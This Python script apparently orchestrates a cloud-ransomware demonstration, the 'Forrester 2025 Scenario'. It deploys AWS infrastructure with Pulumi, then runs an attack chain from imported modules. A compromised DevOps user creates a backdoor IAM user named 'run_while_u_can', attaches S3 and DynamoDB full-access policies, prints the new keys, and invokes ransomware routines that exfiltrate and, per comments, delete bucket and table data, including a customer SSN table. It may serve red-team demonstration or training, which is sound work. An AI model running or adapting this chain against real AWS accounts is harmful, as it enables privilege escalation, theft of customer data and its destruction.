import os
import subprocess
import json
import time
from tqdm import tqdm
from time import sleep
from termcolor import colored
import Functions
from Helpers import loading_animation
import pyqrcode
from clean_up import full_cleanup
import pulumi
import pulumi_aws as aws
import boto3
from attack import Attack
from MFA import MFASetup
from ransomware import Ransomware


# Initialize AWS Clients
iam_client = boto3.client("iam")
sts_client = boto3.client("sts")

PULUMI_OUTPUT_PATH = "/workspaces/Pulumi/Infra/forrester-2025-output.json"

# Define user and initial MFA ARN (this may be empty initially)
user = "DevopsUser"
mfa_arn = ""

# Create MFASetup instance with required parameters
mfa = MFASetup(user, mfa_arn, iam_client, sts_client, PULUMI_OUTPUT_PATH)

# # Load Pulumi Stack Outputs
# stack_outputs = pulumi.StackReference("dev")

# config_bucket_id = stack_outputs.get_output("config_files_bucket")
# customer_bucket_id = stack_outputs.get_output("customer_data_bucket")
# payment_bucket_id = stack_outputs.get_output("payment_data_bucket")
# orders_table_name = stack_outputs.get_output("CustomerOrdersTable")
# ssn_table_name = stack_outputs.get_output("CustomerSSNTable")


def forrester_scenario_execute():
    """🚀 Execute Pulumi Deployment for the Forrester 2025 Attack Scenario"""

    print("-" * 30)
    print(colored("Executing Forrester 2025 Scenario: Compromise DevOps User, takeover, priv escalation, perform ransomware on S3 & DynamoDB", color="red"))
    loading_animation()
    print("-" * 30)

    print(colored("Rolling out Infrastructure via Pulumi", color="red"))
    loading_animation()
    print("-" * 30)

    file_path = "/workspaces/Pulumi/Infra/forrester-2025-output.json"

    # ✅ Ensure Previous Pulumi Output is Removed
    if os.path.exists(file_path):
        os.remove(file_path)
        print(f"📂 Previous Pulumi output file '{file_path}' found and deleted.")
    else:
        print(f"📂 Pulumi output file '{file_path}' not found, proceeding...")

    # ✅ Execute Pulumi Deployment
    # Change current working directory to 'Infra'
    os.chdir("/workspaces/Pulumi/Infra/")
    subprocess.call("pulumi up -s dev -y", shell=True)

    # ✅ Capture Pulumi Stack Output
    subprocess.call("pulumi stack -s dev output --json > /workspaces/Pulumi/Infra/forrester-2025-output.json", shell=True)
    print("📂 Pulumi output saved inside /workspaces/Pulumi/Infra/forrester-2025-output.json")




def forrester_scenario_validate_rollout():
    """🔍 Validate that Pulumi successfully deployed all resources"""

    Functions.wait_for_output_file()
    Functions.validate_pulumi_outputs_after_rollout(pulumi_stack_output_file="/workspaces/Pulumi/Infra/forrester-2025-output.json")




def forrester_scenario_validate_data():
    """🔍 Validate that Pulumi-created data exists in S3 and DynamoDB"""

    print("\n🚀 Running Post-Deployment Validation Checks...")

    # ✅ Ensure Pulumi Stack Output is Up to Date
    subprocess.run("pulumi stack -s dev output --json > /workspaces/Pulumi/Infra/forrester-2025-output.json", shell=True)

    # ✅ Load Pulumi Outputs
    with open("/workspaces/Pulumi/Infra/forrester-2025-output.json", "r") as file:
        outputs = json.load(file)

    # ✅ Validate S3 Buckets
    s3_buckets = [
        outputs["config_files_bucket"],
        outputs["customer_data_bucket"],
        outputs["payment_data_bucket"]
    ]

    for bucket in s3_buckets:
        validation_cmd = f"aws s3 ls s3://{bucket} --region us-east-1"
        result = subprocess.run(validation_cmd, shell=True, capture_output=True, text=True)

        if result.stdout:
            print(f"S3 Validation Passed: Data exists in bucket {bucket}")
        else:
            print(f"ERROR: No data found in {bucket}")

    # ✅ Validate DynamoDB Tables
    dynamodb_tables = ["CustomerOrdersTable", "CustomerSSNTable"]

    for table in dynamodb_tables:
        validation_cmd = f"aws dynamodb scan --table-name {outputs[table]} --region us-east-1 --limit 1"
        result = subprocess.run(validation_cmd, shell=True, capture_output=True, text=True)

        if '"Items"' in result.stdout:
            print(f"DynamoDB Validation Passed: Records found in {outputs[table]}")
        else:
            print(f"ERROR: No records found in {outputs[table]}")

    print("\nPost-Deployment Data Validation Complete!")





def ensure_pulumi_deployment():
    """Ensures Pulumi infrastructure is deployed before Attack initialization"""
    
    print("Starting Infrastructure Deployment...")

    print("\nExecuting Pulumi Deployment...")
    forrester_scenario_execute()

    print("\nValidating Rollout...")
    forrester_scenario_validate_rollout()

    print("\nValidating Data...")
    forrester_scenario_validate_data()

    # ✅ Wait for the Pulumi output file to be generated
    # timeout = 60  # Max 60 seconds
    # elapsed = 0
    # while not os.path.exists(PULUMI_OUTPUT_PATH) and elapsed < timeout:
    #     time.sleep(3)
    #     elapsed += 3

    if not os.path.exists(PULUMI_OUTPUT_PATH):
        raise RuntimeError(f"ERROR: Pulumi output file '{PULUMI_OUTPUT_PATH}' still not found after deployment.")

    print("\nPulumi Deployment Verified! Proceeding...\n")

    # ✅ Let MFA fully register before trying to login
    Functions.progress_bar(seconds=15)






if __name__ == "__main__":
    # print("Starting Infrastructure Deployment...")


    # print("\n\n\n") 
    # print("Executing Pulumi Deployment...")
    # print("\n\n\n")
    # forrester_scenario_execute()

    # print("\n\n\n") 
    # print("Validating Rollout...")
    # print("\n\n\n")
    # forrester_scenario_validate_rollout()

    # print("\n\n\n") 
    # print("Validating Data Population Within Infrastructure for EC2 & DynamoDB")
    # print("\n\n\n")
    # forrester_scenario_validate_data()


    # print("\n\n\n") 
    # print("Setting up MFA for DevOpsUser and getting a session token")
    # print("\n\n\n")
    # mfa.setup_mfa_and_login()


    print("\n\n\n") 
    print("Enumerating on all AWS resoureces and saving to ./AWS_Emumeration")
    print("\n\n\n") 
    attack = Attack()
    attack.enumeration.run_all_enumerations()
    

    print("\n\n\n")
    print("\n DevopsUser creating new user: `run_while_u_can` and obtaining new credentials...")
    print("\n\n\n")
    #####################################################
    ### DevopsUser creating Ransomware user, access keys
    ### &  attaching AWS s3/Dynamodb all access policies
    #####################################################
    user_name = "run_while_u_can"
    ransomware_access_keys = attack.createuser_attatchpolicies.run_pipeline(
        username=user_name,
        policy_arns=[
            "arn:aws:iam::aws:policy/AmazonDynamoDBFullAccess",
            "arn:aws:iam::aws:policy/AmazonS3FullAccess"
        ]
    )

    

    access_key, secret_key = ransomware_access_keys[0][0], ransomware_access_keys[1][0]
    print(f"{user_name} Access Key: {access_key}")
    print(f"{user_name} Secret Key: {secret_key}")

    ransomware = Ransomware(access_key,secret_key)

    ransomware.session_test()


    ransomware.s3_drain.search_and_exfiltrate()

    ransomware.dynamodb_drain.search_and_exfiltrate()





 




    # if ransomware_session:
    #     print("\nNew user `run_while_u_can` is ready. Initiating attack phase...")

    #     # Validating run_while_you_can session identity
    #     # try:
    #     #    sts_client = ransomware_session.client("sts")
    #     #    identity = sts_client.get_caller_identity()
    #     #    print(f"🔍 Confirmed AWS Identity: {identity['Arn']}")
    #     # except Exception as e:
    #     #    print(f"❌ ERROR: Invalid session credentials: {e}")
    #     #    exit(1)

    #     # Initiate S3 Draining using ransomware session
    #     s3_attacker = attack.S3_Drain_Delete(ransomware_session)
    #     s3_attacker.search_and_exfiltrate()

    #     # Initiate DynamoDB Draining using ransomware session
    #     dynamo_attacker = attack.DynamoDB_Drain_Delete(ransomware_session)
    #     dynamo_attacker.search_and_exfiltrate()

    #     print("\nAttack Complete! All data has been exfiltrated and deleted.")
    # else:
    #     print("Failed to create new boto session off of run_while_u_can.")











#     #####################################################
#     ### DevopsUser creating Ransomware user, access keys
#     ### &  attaching AWS s3/Dynamodb all access policies
#     #####################################################
#     attack.createuser_attatchpolicies.run_pipeline(
#         username="run_while_u_can", 
#         policy_arns=[
#             "arn:aws:iam::aws:policy/AmazonDynamoDBFullAccess",
#             "arn:aws:iam::aws:policy/AmazonS3FullAccess"
#         ]
# )


